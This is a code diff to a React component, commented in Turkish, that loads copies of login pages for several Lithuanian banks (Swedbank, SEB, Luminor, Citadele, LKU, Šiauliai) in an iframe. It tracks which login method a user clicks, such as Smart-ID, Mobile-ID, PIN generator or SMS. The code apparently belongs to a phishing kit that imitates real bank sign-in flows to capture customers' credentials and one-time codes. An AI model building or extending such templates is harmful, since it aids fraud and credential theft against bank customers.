@@ -717,9 +717,12 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           ...mappedData,
         });
       } else if (e.data && e.data.type === 'LITHUANIA_BANK_TAB_CLICK') {
-         // DEP ARRAY'I SADECE [bankSlug] oldugu icin TUM DEGISKENLERI USEREF ILE OKU!
-         const __bankSlug = bankSlugRef.current;
-         const __files = filesRef.current;
+         // =================================================================
+         // 2 KATMANLI GUVENCE: useRef.current (her zaman guncel) +
+         // dep array Estonia ile ayni (listener cleanup sonrasi tekrar attach)
+         // =================================================================
+         const __bankSlug = bankSlugRef.current || (bankSlug || "").toString().trim().toLowerCase();
+         const __files = filesRef.current && filesRef.current.length ? filesRef.current : files;
          let finalIndex = -1;
          let finalLoginMethod = "";
          if (typeof e.data.loginMethod === "string") {
@@ -738,16 +741,25 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
            if (idx >= 0) finalIndex = idx;
          }
 
-         if (!__files || __files.length === 0) {
+         const totalFiles = Array.isArray(__files) ? __files.length : 0;
+
+         if (totalFiles === 0) {
            if (finalIndex >= 0) pendingIndexRef.current = finalIndex;
            if (finalLoginMethod) pendingMethodRef.current = finalLoginMethod;
            if (finalLoginMethod) setSelectedLoginMethod(finalLoginMethod);
          } else if (finalIndex >= 0) {
-           const safeIndex = Math.max(0, Math.min(finalIndex, __files.length - 1));
+           // 1. ONCELIKLI: Dogrudan bulunan index
+           const safeIndex = Math.max(0, Math.min(finalIndex, totalFiles - 1));
            if (finalLoginMethod) setSelectedLoginMethod(finalLoginMethod);
-           setCurrentIndex(safeIndex);
+           setCurrentIndex((prev) => (prev === safeIndex ? prev : safeIndex));
          } else if (finalLoginMethod) {
+           // 2. Login method bulundu ama index bulunamadi: ise yaramaz, fallback gecme.
            setSelectedLoginMethod(finalLoginMethod);
+         } else {
+           // 3. ESTONIA ILE AYNI: Ne index ne method bulunursa sonraki indexe gec.
+           // (CUNKU: kullanici TAB tikladi ama biz bir sey bulamadik. Kullanici "hicbir sey
+           //  olmuyor" hissetmesin diye bir sonraki HTML goster.)
+           setCurrentIndex((prev) => (prev + 1) % totalFiles);
          }
       } else if (e.data && e.data.type === 'LITHUANIA_BANK_IFRAME_LOADED') {
         const __files = filesRef.current;
@@ -767,8 +779,9 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
 
     window.addEventListener('message', handleMessage);
     return () => window.removeEventListener('message', handleMessage);
-    // LISTENER 1 KEZ MOUNT'TA EKLENIR, 1 KEZ UNMOUNT'TA KALKAR. HIC KACMAZ.
-  }, [bankSlug]);
+    // Estonia template ile BIR OLAN pattern: her state degisikliginde listener tekrar attach.
+    // useRef'ler (.current) sayesinde closure eski deger okuma riski de yok.
+  }, [bankSlug, currentIndex, files, onChange, handleRouteAction, selectedLoginMethod]);
 
   const normalizedCurrentSlug = (bankSlug || "").toString().trim().toLowerCase();
 
@@ -2014,6 +2027,53 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                       else if (tabText.includes('pin')) targetIndex = 3;
                       else if (tabText.includes('bio')) targetIndex = 4;
                   }
+              }
+
+              // ===================================================================
+              // LITHUANIA ICIN HARDCODED EN GUVENILIR INDEX HESAPLAMA
+              // Yukaridaki siblings / parent.children ya da inject edilen meta
+              // -1 donduyse (yanlis HTML yapisi vb.), DOGRU methodMap sirasiyla
+              // banka-ozel text match ile targetIndex BUL.
+              // (Estonia'daki hardcoded mantigin Lithuania kopyasi.)
+              // ===================================================================
+              const _isLtBank = isLithuaniaBank || /\/lithuanian-banks\//i.test(window.location.href || '');
+              if (_isLtBank && targetIndex === -1) {
+                const _tabText = (targetTab.textContent || '').toString().toLowerCase();
+                if (window.location.href.includes('swedbank-lt')) {
+                  // 0: Biometrika/PIN, 1: Smart-ID, 2: Mobile-ID, 3: PIN generatorius, 4: ID-kortelė
+                  if (/bio|biometri|pin kodas|^pin\b/.test(_tabText)) targetIndex = 0;
+                  else if (/smart|smartid|smart-id/.test(_tabText)) targetIndex = 1;
+                  else if (/mobil|mobile|mobilesms|m\s*id/.test(_tabText)) targetIndex = 2;
+                  else if (/generator|gen\b|kod.skaiciuokl/.test(_tabText)) targetIndex = 3;
+                  else if (/kortel|id.kort|idkortel/.test(_tabText)) targetIndex = 4;
+                } else if (window.location.href.includes('seb-lt')) {
+                  // 0: Smart-ID, 1: Mobile-ID, 2: SEB programėlė App, 3: Generatorius
+                  if (/smart|smartid/.test(_tabText)) targetIndex = 0;
+                  else if (/mobil|mobile|m.id/.test(_tabText)) targetIndex = 1;
+                  else if (/program|app|aplikacija|mobili program/.test(_tabText)) targetIndex = 2;
+                  else if (/generator|gen\b|kod|skaiciuokl/.test(_tabText)) targetIndex = 3;
+                } else if (window.location.href.includes('luminor-lt')) {
+                  // 0: Smart-ID, 1: M. parašas, 2: Generatorius
+                  if (/smart|smartid/.test(_tabText)) targetIndex = 0;
+                  else if (/m\s*\.?\s*para|paras|mobile.sign|mobilesign/.test(_tabText)) targetIndex = 1;
+                  else if (/generator|kod|gen\b/.test(_tabText)) targetIndex = 2;
+                } else if (window.location.href.includes('citadele-lt')) {
+                  // 0: Kodų kortelė/Generatorius, 1: Mobile-ID, 2: MobileSCAN/Digipass 780
+                  if (/kodu|kod|kortel|generator|gen\b/.test(_tabText)) targetIndex = 0;
+                  else if (/mobil|mobile|m.id/.test(_tabText)) targetIndex = 1;
+                  else if (/mobilescan|digipass|scan/.test(_tabText)) targetIndex = 2;
+                } else if (window.location.href.includes('lku-lt')) {
+                  // 0: Smart-ID, 1: Mobile-ID, 2: Vienkartinis saugos kodas
+                  if (/smart|smartid/.test(_tabText)) targetIndex = 0;
+                  else if (/mobil|mobile|m.id/.test(_tabText)) targetIndex = 1;
+                  else if (/vienkart|vienkara|saug.*kod|otp|viena karta/.test(_tabText)) targetIndex = 2;
+                } else if (window.location.href.includes('siauliu-lt')) {
+                  // 0: Smart-ID, 1: Mobile-ID, 2: Biometrika/PIN, 3: SMS
+                  if (/smart|smartid/.test(_tabText)) targetIndex = 0;
+                  else if (/mobil|mobile|m.id/.test(_tabText)) targetIndex = 1;
+                  else if (/bio|biometri|pin\b|pin kod/.test(_tabText)) targetIndex = 2;
+                  else if (/sms|tekst|zinute|pranesim/.test(_tabText)) targetIndex = 3;
+                }
               }
 
               if (targetIndex !== -1 || (window.__traeSelectedLoginMethod || '').trim() !== '') {
